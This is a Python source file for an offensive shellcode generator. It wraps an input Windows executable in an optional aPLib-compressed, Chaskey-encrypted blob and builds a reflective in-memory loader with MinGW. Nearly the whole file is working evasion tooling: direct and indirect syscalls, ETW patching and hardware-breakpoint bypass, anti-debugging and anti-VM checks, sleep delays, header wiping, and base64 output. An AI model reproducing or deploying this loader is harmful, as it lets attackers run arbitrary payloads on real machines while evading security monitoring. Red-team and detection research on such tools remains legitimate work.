import os
import sys
import subprocess
import textwrap
import base64
import struct
import ctypes
from pathlib import Path

gcc_names = {"x86_64-w64-mingw32-gcc", "x86_64-w64-mingw32-gcc.exe"}
objcopy_names = {"objcopy", "objcopy.exe"}

paths = os.environ.get("PATH", "").split(os.pathsep)

gcc_found = None
objcopy_found = None

for p in paths:
    for name in gcc_names | objcopy_names:
        full = os.path.join(p, name)
        if os.path.isfile(full) and os.access(full, os.X_OK):
            if name in gcc_names and not gcc_found:
                gcc_found = full
            elif name in objcopy_names and not objcopy_found:
                objcopy_found = full
    if gcc_found and objcopy_found:
        break

if not gcc_found:
    print("[!] MinGW-w64 GCC not found")
    sys.exit(1)

# Chaskey block & PRF to generate CTR keystream
def ROTL(x, b):
    return ((x >> (32 - b)) | (x << b)) & 0xFFFFFFFF

def chaskey_block(v, k):
    v0, v1, v2, v3 = v
    k0, k1, k2, k3 = k
    v0 ^= k0; v1 ^= k1; v2 ^= k2; v3 ^= k3
    for _ in range(8):
        v0 = (v0 + v1) & 0xFFFFFFFF
        v1 = ROTL(v1, 5) ^ v0
        v0 = ROTL(v0, 16)
        v2 = (v2 + v3) & 0xFFFFFFFF
        v3 = ROTL(v3, 8) ^ v2
        v0 = (v0 + v3) & 0xFFFFFFFF
        v3 = ROTL(v3, 13) ^ v0
        v2 = (v2 + v1) & 0xFFFFFFFF
        v1 = ROTL(v1, 7) ^ v2
        v2 = ROTL(v2, 16)
    v0 ^= k0; v1 ^= k1; v2 ^= k2; v3 ^= k3
    return (v0, v1, v2, v3)

def chaskey_prf(key_bytes, block_bytes):
    k = struct.unpack("<4I", key_bytes)
    v = struct.unpack("<4I", block_bytes)
    out = chaskey_block(v, k)
    return struct.pack("<4I", *out)

def chaskey_ctr_keystream(key, nonce, length):
    stream = bytearray()
    ctr = 0
    while len(stream) < length:
        block = nonce + struct.pack("<I", ctr) + b"\x00\x00\x00\x00"
        stream.extend(chaskey_prf(key, block))
        ctr = (ctr + 1) & 0xFFFFFFFF
    return bytes(stream[:length])

# --- CLI and I/O ---
if len(sys.argv) < 3 or sys.argv[1][0] == "-" or sys.argv[2][0] == "-":
    print(f"Usage: {os.path.basename(sys.argv[0])} <input_pe> <output.bin> [-exe|-dll] [-direct|-indirect] [-encrypt] [-compress] [-wipeheaders] [-exitthread|-exitprocess] [-sleep <secs>] [-etwpatch|-etwhwbp] [-antidebug] [-antivm] [-base64]")
    sys.exit(1)

args = [a.lower() for a in sys.argv]
input_pe = sys.argv[1]
output_bin = sys.argv[2]

use_exe = any(a in args for a in ("-exe",))
use_dll = any(a in args for a in ("-dll",))
wipe_headers = any(a in args for a in ("-wipeheaders", "-wipe"))
use_encrypt = any(a in args for a in ("-encrypt", "-enc"))
use_b64 = any(a in args for a in ("-base64", "-b64"))
use_indirect = any(a in args for a in ("-indirect",))
use_direct = any(a in args for a in ("-direct",))
use_etw_patch = any(a in args for a in ("-etwpatch", "-patch"))
use_etw_hwbp  = any(a in args for a in ("-etwhwbp", "-hwbp"))
use_antidebug = any(a in args for a in ("-antidebug", "-antidbg"))
use_antivm = any(a in args for a in ("-antivm",))
use_compress = any(a in args for a in ("-compress",))
use_exitthread  = any(a in args for a in ("-exitthread", "-thread"))
use_exitprocess = any(a in args for a in ("-exitprocess", "-process"))

sleep_stmt = ""

if "-sleep" in args:
    try:
        idx = args.index("-sleep")
        val = float(args[idx + 1])
        ms = int(val * 1000)

        if use_direct or use_indirect:
            sleep_stmt = f"SYSCALL_SLEEP(ctx, {ms});"
        else:
            sleep_stmt = f"mySleep({ms});"

    except (IndexError, ValueError):
        print("[-] Invalid usage of -sleep; specify a number in seconds.")
        sys.exit(1)

if use_etw_patch and use_etw_hwbp:
    print("[!] Cannot use -etwpatch and -etwhwbp together.")
    sys.exit(1)

etw_patch_header = ""

if use_etw_patch or use_etw_hwbp:
    etw_patch_header = '#include "etw_bypass.h"'

if use_etw_patch:
    if "-indirect" in args or "-direct" in args:
        etwpatch = "SYSCALL_ETWPATCH(ctx);"
    else:
        etwpatch = "ETWPATCH();"

elif use_etw_hwbp:
    if "-indirect" in args or "-direct" in args:
        etwpatch = "SYSCALL_ETWHWBP(ctx);"
    else:
        etwpatch = "ETWHWBP();"
else:
    etwpatch = ""

if use_antidebug:
    anti_debug = "ANTI_DEBUG();"
else:
    anti_debug = ""

if use_antivm:
    anti_vm = "ANTI_VM();"
else:
    anti_vm = ""

if not objcopy_found and not use_exe and not use_dll:
    print("[!] objcopy not found")
    sys.exit(1)

if use_direct and use_indirect:
    print("[-] Cannot use -direct and -indirect together.")
    sys.exit(1)

if use_exitthread and use_exitprocess:
    print("[-] Cannot use -exitthread and -exitprocess together.")
    sys.exit(1)

if use_direct or use_indirect:
    if use_exitthread:
        exit_stmt = "SYSCALL_EXITTHREAD(ctx, 0);"
    elif use_exitprocess:
        exit_stmt = "SYSCALL_EXITPROCESS(ctx, 0);"
    else:
        exit_stmt = ""
else:
    if use_exitthread:
        exit_stmt = "myExitThread(0);"
    elif use_exitprocess:
        exit_stmt = "myExitProcess(0);"
    else:
        exit_stmt = ""

try:
    with open(input_pe, "rb") as f:
        pe_bytes = f.read()
except FileNotFoundError:
    print(f"[-] File not found: {input_pe}")
    sys.exit(1)

if len(pe_bytes) < 2 or pe_bytes[:2] != b"MZ":
    print("[-] Input is not a valid PE")
    sys.exit(1)

e_lfanew = struct.unpack_from("<I", pe_bytes, 0x3C)[0]

opt = e_lfanew + 24
magic = struct.unpack_from("<H", pe_bytes, opt)[0]

if magic == 0x20B:  # PE32+
    data_dir = opt + 112
elif magic == 0x10B:  # PE32
    data_dir = opt + 96

clr_rva, _ = struct.unpack_from("<II", pe_bytes, data_dir + 14 * 8)

if clr_rva != 0:
    print("[-] .NET is not supported")
    sys.exit(1)

if magic != 0x20B:
    print("[-] x86 is not supported")
    sys.exit(1)

# --- aPLib compression ---
if use_compress:
    BASE_DIR = Path(__file__).resolve().parent
    SYSTEM = sys.platform
    
    if SYSTEM == "win32":
        LIB_PATH = BASE_DIR / "aPLib/lib/aplib64.dll"
        LIBRARY = ctypes.WinDLL(str(LIB_PATH))
        CALLBACK_TYPE = ctypes.WINFUNCTYPE
    elif SYSTEM == "linux":
        LIB_PATH = BASE_DIR / "aPLib/lib/aplib64.so"
        LIBRARY = ctypes.CDLL(str(LIB_PATH))
        CALLBACK_TYPE = ctypes.CFUNCTYPE
    
    else:
        raise RuntimeError("[-] Unsupported platform")
    
    try:
        aplib = LIBRARY
    
        aplib.aP_workmem_size.argtypes = [ctypes.c_uint]
        aplib.aP_workmem_size.restype = ctypes.c_uint
    
        aplib.aP_pack.argtypes = [
            ctypes.c_void_p,
            ctypes.c_void_p,
            ctypes.c_uint,
            ctypes.c_void_p,
            ctypes.c_void_p,
            ctypes.c_void_p
        ]
        aplib.aP_pack.restype = ctypes.c_uint
    
    except Exception as e:
        print(f"[-] Failed to load aPLib: {e}")
    
    
    def aplib_compress(data: bytes):
        size = len(data)
    
        workmem = aplib.aP_workmem_size(size)
        max_out = aplib.aP_max_packed_size(size)
    
        src = ctypes.create_string_buffer(data, size)
        dst = ctypes.create_string_buffer(max_out)
        wm = ctypes.create_string_buffer(workmem)
    
        packed = aplib.aP_pack(src, dst, size, wm, None, None)
    
        if packed == 0xFFFFFFFF:
            raise RuntimeError("[-] Compression failed")
    
        return dst.raw[:packed], size

if use_compress:
    orig_size = len(pe_bytes)
    compressed, orig_size = aplib_compress(pe_bytes)
    working_bytes = compressed
else:
    working_bytes = pe_bytes
    orig_size = ""

# --- Encryption --- 
if use_encrypt:
    chaskey_key = os.urandom(16)
    chaskey_nonce = os.urandom(8)

    keystream = chaskey_ctr_keystream(
        chaskey_key,
        chaskey_nonce,
        len(working_bytes)
    )

    data_bytes = bytes(p ^ k for p, k in zip(working_bytes, keystream))
else:
    data_bytes = working_bytes

hex_array = ", ".join(f"0x{b:02x}" for b in data_bytes)

if use_encrypt:
    key_literal = ", ".join(f"0x{b:02x}" for b in chaskey_key)
    nonce_literal = ", ".join(f"0x{b:02x}" for b in chaskey_nonce)
    c_source = textwrap.dedent(f"""
    #if defined(INDIRECT)
        #include "indirect_syscall.h"
        #include "syscall_pe_loader.h"
    #elif defined(DIRECT)
        #include "direct_syscall.h"
        #include "syscall_pe_loader.h"
    #else
        #include "pe_loader.h"
    #endif

    #ifdef DECOMPRESS
        #include "aPLib/depack.c"
    #endif

    {etw_patch_header}

    typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(
        HANDLE ProcessHandle,
        PVOID *BaseAddress,
        ULONG_PTR ZeroBits,
        PSIZE_T RegionSize,
        ULONG AllocationType,
        ULONG Protect
    );

    typedef unsigned long u32;

    __attribute__((section(".text"), aligned(1)))
    unsigned char enc_blob[] = {{
        {hex_array}
    }};

    #ifdef DECOMPRESS
        unsigned int decompressed_size = {orig_size};
    #endif

    __attribute__((section(".text"), aligned(1)))
    unsigned char chaskey_key[16] = {{{key_literal}}};

    __attribute__((section(".text"), aligned(1)))
    unsigned char chaskey_nonce[8] = {{{nonce_literal}}};

    #define ROTL(x,b) (((x) >> (32 - (b))) | ((x) << (b)))

    void chaskey_block(u32 v[4], u32 k[4]) {{
        int i;
        for(i=0;i<4;i++) v[i] ^= k[i];
        for(i=0;i<8;i++) {{
            v[0] += v[1]; v[1] = ROTL(v[1],5) ^ v[0]; v[0] = ROTL(v[0],16);
            v[2] += v[3]; v[3] = ROTL(v[3],8) ^ v[2];
            v[0] += v[3]; v[3] = ROTL(v[3],13) ^ v[0];
            v[2] += v[1]; v[1] = ROTL(v[1],7) ^ v[2]; v[2] = ROTL(v[2],16);
        }}
        for(i=0;i<4;i++) v[i] ^= k[i];
    }}

    void chaskey_prf(unsigned char in[16], unsigned char out[16]) {{
        u32 v[4], k[4];
        int i;
        for(i=0;i<4;i++) {{
            v[i] = ((u32*)in)[i];
            k[i] = ((u32*)chaskey_key)[i];
        }}
        chaskey_block(v, k);
        for(i=0;i<4;i++) ((u32*)out)[i] = v[i];
    }}

      void decrypt_blob(unsigned char *dst) {{
          u32 ctr = 0;
          unsigned char blk[16], ks[16];
          unsigned int i, j;
      
          for (i = 0; i < sizeof(enc_blob); i += 16) {{
              for (j = 0; j < 8; j++) blk[j] = chaskey_nonce[j];
              *(u32 *)(blk + 8)  = ctr;
              *(u32 *)(blk + 12) = 0;
      
              chaskey_prf(blk, ks);
      
              for (j = 0; j < 16 && (i + j) < sizeof(enc_blob); j++)
                  dst[i + j] = enc_blob[i + j] ^ ks[j];
      
              ctr++;
          }}
      }}

    __attribute__((section(".text.start")))
void _start(void) {{
#if defined(DIRECT) || defined(INDIRECT)
    {anti_debug}
    {anti_vm}
    SYSCALL_INIT(ctx);
    {etwpatch}
    {sleep_stmt}
    
    SYSCALL_PREPARE(ctx, ntallocatevirtualmemory);
    NtAllocateVirtualMemory_t NtAllocateVirtualMemory =
        SYSCALL_CALL(ctx, NtAllocateVirtualMemory_t);

    PVOID pe = NULL;
    SIZE_T size = sizeof(enc_blob);

    NtAllocateVirtualMemory(
        (HANDLE)-1,
        &pe,
        0,
        &size,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_READWRITE
    );

    #ifndef DECOMPRESS
        FreeSyscallStub(ctx, NtAllocateVirtualMemory);
    #endif

    decrypt_blob((unsigned char*)pe);

    #ifdef DECOMPRESS 
        PVOID final_pe = pe;
        SIZE_T final_size = size;
    
        PVOID tmp = NULL;
        SIZE_T dsize = decompressed_size;
    
        NtAllocateVirtualMemory(
            (HANDLE)-1,
            &tmp,
            0,
            &dsize,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_READWRITE
        );
        FreeSyscallStub(ctx, NtAllocateVirtualMemory);
    
        aP_depack(pe, tmp);

        SYSCALL_PREPARE(ctx, ntfreevirtualmemory);
        NtFreeVirtualMemory_t NtFreeVirtualMemory =
            SYSCALL_CALL(ctx, NtFreeVirtualMemory_t);

        SIZE_T sz = 0;
        NtFreeVirtualMemory((HANDLE)-1, &pe, &sz, MEM_RELEASE);
        FreeSyscallStub(ctx, NtFreeVirtualMemory);

        final_pe = tmp;
        final_size = dsize;
    #else
        PVOID final_pe = pe;
        SIZE_T final_size = size;
    #endif

    ULONG oldProt;
    NtProtectVirtualMemory_t NtProtectVirtualMemory =
        SYSCALL_CALL(ctx, NtProtectVirtualMemory_t);

    NtProtectVirtualMemory(
        (HANDLE)-1,
        &final_pe,
        &final_size,
        PAGE_EXECUTE_READ,
        &oldProt
    );
    FreeSyscallStub(ctx, NtProtectVirtualMemory);

    ExecuteFromMemory(ctx, final_pe);
    {exit_stmt}
#else
    {anti_debug}
    {anti_vm}
    {etwpatch}
    {sleep_stmt}

    HMODULE hNtdll = myGetModuleHandleH(ntdll_dll);
    NtAllocateVirtualMemory_t NtAllocateVirtualMemory =
        (NtAllocateVirtualMemory_t)myGetProcAddressH(hNtdll, ntallocatevirtualmemory);

    NtFreeVirtualMemory_t NtFreeVirtualMemory =
        (NtFreeVirtualMemory_t)myGetProcAddressH(hNtdll, ntfreevirtualmemory);

    PVOID pe = NULL;
    SIZE_T size = sizeof(enc_blob);

    NtAllocateVirtualMemory(
        (HANDLE)-1,
        &pe,
        0,
        &size,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_READWRITE
    );

    decrypt_blob((unsigned char*)pe);

    #ifdef DECOMPRESS 
        PVOID final_pe = pe;
        SIZE_T final_size = size;
    
        PVOID tmp = NULL;
        SIZE_T dsize = decompressed_size;
    
        NtAllocateVirtualMemory(
            (HANDLE)-1,
            &tmp,
            0,
            &dsize,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_READWRITE
        );
    
        aP_depack(pe, tmp);
    
        SIZE_T sz = 0;
    
        NtFreeVirtualMemory(
            (HANDLE)-1,
            &pe,
            &sz,
            MEM_RELEASE
        );
    
        final_pe = tmp;
        final_size = dsize;
    #else
        PVOID final_pe = pe;
        SIZE_T final_size = size;
    #endif

    ULONG oldProt;
    NtProtectVirtualMemory_t NtProtectVirtualMemory =
        (NtProtectVirtualMemory_t)myGetProcAddressH(hNtdll, ntprotectvirtualmemory);

    NtProtectVirtualMemory(
        (HANDLE)-1,
        &final_pe,
        &final_size,
        PAGE_EXECUTE_READ,
        &oldProt
    );

    ExecuteFromMemory(final_pe);
    {exit_stmt}
#endif
}}
    """)

else:
    c_source = textwrap.dedent(f"""
    #if defined(INDIRECT)
        #include "indirect_syscall.h"
        #include "syscall_pe_loader.h"
    #elif defined(DIRECT)
        #include "direct_syscall.h"
        #include "syscall_pe_loader.h"
    #else
        #include "pe_loader.h"
    #endif

    #ifdef DECOMPRESS
        #include "aPLib/depack.c"
    #endif

    typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(
        HANDLE ProcessHandle,
        PVOID *BaseAddress,
        ULONG_PTR ZeroBits,
        PSIZE_T RegionSize,
        ULONG AllocationType,
        ULONG Protect
    );

    {etw_patch_header}

    __attribute__((section(".text"), aligned(1)))
    unsigned char pe_blob[] = {{
        {hex_array}
    }};

    #ifdef DECOMPRESS
        unsigned int decompressed_size = {orig_size};
    #endif
    
    __attribute__((section(".text.start")))
    void _start(void) {{
    #if defined(DIRECT) || defined(INDIRECT)
        {anti_debug}
        {anti_vm}
        SYSCALL_INIT(ctx);
        {etwpatch}
        {sleep_stmt}
    #ifdef DECOMPRESS 
        SYSCALL_PREPARE(ctx, ntallocatevirtualmemory);
        NtAllocateVirtualMemory_t NtAllocateVirtualMemory =
            SYSCALL_CALL(ctx, NtAllocateVirtualMemory_t);
    
        PVOID final_pe = NULL;
        SIZE_T final_size = decompressed_size;
    
        NtAllocateVirtualMemory(
            (HANDLE)-1,
            &final_pe,
            0,
            &final_size,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_READWRITE
        );
        FreeSyscallStub(ctx, NtAllocateVirtualMemory);
        
        aP_depack(pe_blob, final_pe);
    
        ExecuteFromMemory(ctx, final_pe);
    #else
        ExecuteFromMemory(ctx, pe_blob);
    #endif
        {exit_stmt}
    #else
        {anti_debug}
        {anti_vm}
        {etwpatch}
        {sleep_stmt}
    #ifdef DECOMPRESS
        HMODULE hNtdll = myGetModuleHandleH(ntdll_dll);
    
        NtAllocateVirtualMemory_t NtAllocateVirtualMemory =
            (NtAllocateVirtualMemory_t)myGetProcAddressH(hNtdll, ntallocatevirtualmemory);
    
        PVOID final_pe = NULL;
        SIZE_T final_size = decompressed_size;
    
        NtAllocateVirtualMemory(
            (HANDLE)-1,
            &final_pe,
            0,
            &final_size,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_READWRITE
        );
    
        aP_depack(pe_blob, final_pe);
    
        ExecuteFromMemory(final_pe);
    #else
        ExecuteFromMemory(pe_blob);
    #endif
        {exit_stmt}
    #endif
    }}
    """)

output_file = output_bin if use_exe or use_dll else "temp_compile.exe"
compile_cmd = [
    "x86_64-w64-mingw32-gcc", "-x", "c", "-",
    "-nostdlib", "-nostartfiles", "-ffreestanding",
    "-Wl,-subsystem,windows", "-e", "_start",
    "-Os", "-s", "-fno-ident", "-flto",
    "-Wl,--exclude-all-symbols",
    "-Wl,--no-insert-timestamp",
    "-fno-asynchronous-unwind-tables",
    "-mno-stack-arg-probe",
    "-o", output_file
]

if use_indirect:
    compile_cmd.extend(["-DINDIRECT"])
elif use_direct:
    compile_cmd.extend(["-DDIRECT"])

if wipe_headers:
    compile_cmd.extend(["-DWIPEHEADERS"])
elif use_encrypt:
    compile_cmd.extend(["-DWIPEMEM"])

if use_compress:
    compile_cmd.extend(["-DDECOMPRESS"])

if use_dll:
    compile_cmd.extend(["-shared"])
elif not use_exe and not use_dll:
    compile_cmd.extend(["-T", "linker.ld"])

try:
    result = subprocess.run(
        compile_cmd,
        input=c_source.encode(),
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    
    stderr_lines = result.stderr.decode().splitlines()
    filtered_stderr = ""
    for line in result.stderr.decode().splitlines():
        if ".text: section below image base" not in line:
            filtered_stderr += line + "\n"
    
    if filtered_stderr:
        print(filtered_stderr)

    if result.returncode != 0:
        sys.exit(1)

    if not use_exe and not use_dll:
        subprocess.run(
            ["objcopy", "-O", "binary", "--only-section=.text", output_file, output_bin],
            check=True
        )
        os.remove(output_file)

        if use_b64:
            with open(output_bin, "rb") as f:
                b = f.read()
            with open(output_bin, "w") as f:
                f.write(base64.b64encode(b).decode())
            print(f"[+] Base64 shellcode generated: {output_bin}")
        else:
            print(f"[+] Shellcode generated: {output_bin}")

    elif use_dll:
        if use_b64:
            with open(output_file, "rb") as f:
                b = f.read()
            with open(output_file, "w") as f:
                f.write(base64.b64encode(b).decode())
            print(f"[+] Base64 DLL generated: {output_file}")
        else:
            print(f"[+] DLL generated: {output_file}")

    else:
        if use_b64:
            with open(output_file, "rb") as f:
                b = f.read()
            with open(output_file, "w") as f:
                f.write(base64.b64encode(b).decode())
            print(f"[+] Base64 executable generated: {output_file}")
        else:
            print(f"[+] Executable generated: {output_file}")

except subprocess.CalledProcessError:
    sys.exit(1)
    
except KeyboardInterrupt:
    try:
        if os.path.exists(output_file):
            os.remove(output_file)
    finally:
        sys.exit(130)
